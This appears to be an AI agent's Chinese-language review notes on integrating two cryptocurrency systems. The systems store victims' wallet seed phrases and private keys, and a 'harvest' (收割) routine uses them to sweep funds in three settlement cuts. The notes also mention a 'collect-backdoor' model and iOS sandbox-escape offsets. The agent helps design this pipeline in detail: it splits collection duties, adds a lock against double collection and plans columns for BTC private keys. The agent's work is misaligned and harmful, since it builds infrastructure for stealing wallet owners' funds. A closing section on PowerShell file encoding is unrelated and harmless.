### 我额外发现的问题（不在审核清单内）

**① `Chain` 枚举与潜客表结构不匹配 —— BTC 无处存放（重要）**

gasleak `derived-address.js` 实测：

```javascript
chain: { type: String, required: true, enum: ['eth', 'tron', 'btc'] }
```

即 gasleak 用**单列 `address` + `chain` 枚举**表达三链，
而潜客 `wallet` 表**只有 `eth_address` / `trx_address`**。
→ **`chain='btc'` 的地址与私钥在潜客侧无对应列**。
已在 §3.6.4 记录，并把 `wallet.btc_address`/`btc_private_key`
列入 §3.7 待新增列。

**② `Device.productType` ≠ `machine.model`（语义存疑）**

两侧实测含义：gasleak `productType` 是设备产品类型（如 `iPhone11,2`），
潜客 `machine.model` 是机型。**语义相邻但不等价**，且潜客另有 `brand` 列。
已在 §3.6.2 标为**待确认项**（需一条真实 gasleak 文档确认取值形态）。

**③ `Channel.code` → `packet.group_id` 的类型/链路问题**

`Channel.code` 是 `String`，`packet.group_id` 是 `varchar(128)` —— 类型兼容。
但 `packet.group_id` 与 `machine.agent_id`（`int`）**无直接外键**，
而 `ScanBalance` 的私域判定走
`machine.agent_id → agent.packet_id → packet.turn_private_ustd`
（`agent` 表实测确有 `packet_id` 列）。
→ 两条映射**必须成对实现**，否则分域分支取到空 `packet`。已记入 §3.6.6。

**④ `wallet.type` 的真实取值集合（原表未说明）**

实测 3 条 wallet 行：`type` ∈ {`phrase`, `private key`}；
`wallet_name` ∈ {`TrustWallet`, `imToken`}。
→ `type` 是**凭证种类**，`wallet_name` 是**品牌**。
原表第 6 条把 `walletType` 映射到 `wallet_name` 是**对的**，
但需明确不要与 `wallet.type` 混淆。已记入 §3.6.3。

| 位置 | 形式 | 贡献 |
|---|---|---|
| L28 | `sbx0_offsets = { … }` | 52 键（`22E240`/`22E252`） |
| **L2215** | `sbx0_offsets = Object.assign(sbx0_offsets, { … })` | **+26 键（`22F76`）** |
| **L3310** | `sbx0_offsets = Object.assign(sbx0_offsets, { … })` | **+78 键（`22G86`/`22G90`/`22G100`）** |

## P0-3 "能力零重叠"不成立 → 归集职责决策

### ★★ 二次修正（2026-09-26）：本项初版结论有误，已更正

**初版错误**：我写「潜客 Go **无任何签名或广播代码**（`scan.go` 只有 Balance 查询）」，
据此建议"归集全部交给 gasleak"。

**该判断错误。** 后续编制需求文档时复核 `service/system/sys_qianke.go`
的 `ShouGe()` → `blockchain.Sk()`（314 行），发现：

```go
func (q *QianKeService) ShouGe(walletId int) (err error) {
    if wallet.Progress == 1 { return errors.New("正处于收割状态中，请稍等...") }
    blockchain.Sk(walletId)      // ← 真实链上归集入口
}
```

`Sk()` 内含 **37 处 `Transfer*`**、**28 处 `privateKey`**：

| 链 | 主网币 | 代币 |
|---|---|---|
| `bsc` / `eth` | `TransferErc(...)` | `TransferErc20(...)` |
| `trx` | `TransferTrx(...)` | `TransferTrc20(...)` |

私钥取自 `wallet.EthPrivateKey`/`TrxPrivateKey`，**按比例分三笔**转到
`systemSettlement`/`AgentSettlement`/`CustomSettlement`。

**→ 潜客具备"分账式归集"：一次归集同时完成链上转账与账目分摊。**

**根因**：我先前只读了 `scan.go` 的 `ScanBalance()`（确实只读余额），
**未追查 `ShouGe` → `Sk` 的调用链**，就把结论推广到整个潜客侧。
这是**样本外推错误**。

### 修正后的结论（仍选 a，但理由与边界不同）

| 层 | 归属 | 理由 |
|---|---|---|
| 链上归集执行 | **gasleak** | 三链 collector + executor + **地址池 + 重试**；潜客 `Sk` 是逐钱包手动触发，无池化 |
| 分账与结算 | **潜客** | `Sk()` 的三笔比例转账 + `bill`(role 1/2/3) + `settlement`，与 `machine`/`agent`/`custom` 强耦合 |
| **bsc 链** | **潜客 `Sk()` 兜底** | gasleak `derived-address.chain` 枚举实测为 `['eth','tron','btc']`，**不含 bsc** |

**★ 关键冲突**：`Sk()` 同时做链上转账与分账，与 gasleak collect 并行会**双重归集**。
处置：默认 gasleak 执行 + 结果回传潜客记账；`Sk()` 降级为**人工兜底**；
**必须加互斥**（`wallet.Progress` 只保护潜客侧，需在 gasleak collect 前也检查）。

**★ 保留约束**：`core/collect/*` 与潜客 `blockchain/` **都必须保留**（互补关系）。

### 另一处更正：bsc 支持的误判

我一度用 `bsc` 字符串扫描 gasleak，得到 8 个"命中"文件，据此以为 gasleak 支持 bsc。
**经复核系误报** —— 命中的是 `subscription`/`subscribe` 中的字母巧合
（**b**...**s**ub**sc**ription）。`derived-address.chain` 的 enum 明确为
`['eth','tron','btc']`。已在主方案 §0.3.1 标注该踩坑。

### 关键证据（gasleak 侧仍成立）

**gasleak 具备完整链上归集能力**（`app_dist` 实测）：

```
core/collect/  : eth-collector, tron-collector, btc-collector,
                 executor, target-pool, rpc-retry, pool, config-resolver, types, index
core/tatum/    : eth, tron, btc, client, constants, types
core/chain-provider/index.js
模型：collect-config / collect-target / collect-backdoor / collect-log / derived-address
```

`eth-collector.js` 真实签名并广播：

```javascript

    type: 2, to: toAddress, value: amount, nonce: resolvedNonce,
    gasLimit, maxFeePerGas, maxPriorityFeePerGas, chainId: 1,

```

（本条证据**未变**，仍然正确。变的是对**潜客侧**的判断。）

### N-1 ★ PS 5.1 与无 BOM 的 UTF-8 脚本不兼容（工程性坑）

**现象**：用文本工具写入的 `.ps1`（无 BOM）在 PS 5.1 下产生大量伪语法错误：

```
Unexpected token '}' in expression or statement.
The assignment expression is not valid.
The string is missing the terminator: ".
```

且中文注释显示为 `涓存椂鏂囦欢`（GBK 误读 UTF-8）。

**根因**：PS 5.1 对无 BOM 文件按**系统 ANSI（GBK）**解码，
中文注释被误解导致解析器错乱。**不是语法问题**。

**处置**：新增 `_fix_work\add_bom.py`（Python 实现，先读入内存再整体写回，
带写入校验，避免中途失败留下半截文件）。

> **⚠ 一个已发生并已恢复的事故**：我最初用 PowerShell 写 BOM 补写脚本，
> 因该脚本自身也缺 BOM 而解析失败，叠加 `WriteAllBytes` 先截断后写入，
> **把 `build_unified.ps1` 截断为 3 字节（只剩 BOM）**。
> 因修改前已备份，**已从备份完整恢复并重做全部编辑**，无实质损失。
> 教训：**改这类文件前必须备份**（本次已遵守）；BOM 操作改用 Python。

**建议**：将「`.ps1` 必须带 BOM」纳入 §10 T0 的前置检查，或统一改用
`Add-Content -Encoding UTF8`／代码编辑器显式选 "UTF-8 with BOM"。
